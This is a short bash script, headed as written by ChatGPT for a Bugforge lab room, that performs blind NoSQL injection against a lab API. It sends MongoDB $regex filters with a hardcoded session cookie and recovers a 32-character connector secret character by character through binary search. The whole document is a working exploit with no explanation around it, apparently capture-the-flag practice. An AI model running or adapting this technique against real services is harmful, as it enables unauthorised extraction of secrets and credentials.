# script by chatgpt for Bugforge room Vaulty

#!/usr/bin/env bash
set -euo pipefail

BASE='https://lab-1788190941597-vf4p2n.labs-app.bugforge.io'
ALPHABET='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-'
SESSION='vaultly_session=kGOWB7Wjh_Ogha_wFikqDIsvTGxC0lwJ'
PREFIX=''

matches() {
  local pattern="$1"
  local body response

  body=$(printf \
    '{"filter":{"type":"connector","org":"vaultly-hq","secret":{"$regex":"%s"}}}' \
    "$pattern")

  response=$(curl -sS  \
    -H 'Content-Type: application/json' \
    -H "Cookie: $SESSION" \
    --data "$body" \
    "$BASE/api/connectors/directory/query")

  [[ "$response" == *'"matched":true'* ]]
}

for ((position=0; position<32; position++)); do
  candidates="$ALPHABET"

  while ((${#candidates} > 1)); do
    half=$(((${#candidates} + 1) / 2))
    left=${candidates:0:half}
    right=${candidates:half}
    alternatives=''

    for ((i=0; i<${#left}; i++)); do
      char=${left:i:1}
      alternatives+="${alternatives:+|}${char}"
    done

    if matches "^${PREFIX}(?:${alternatives})"; then
      candidates="$left"
    else
      candidates="$right"
    fi
  done

  PREFIX+="$candidates"
  printf '%s\n' "$PREFIX"
done
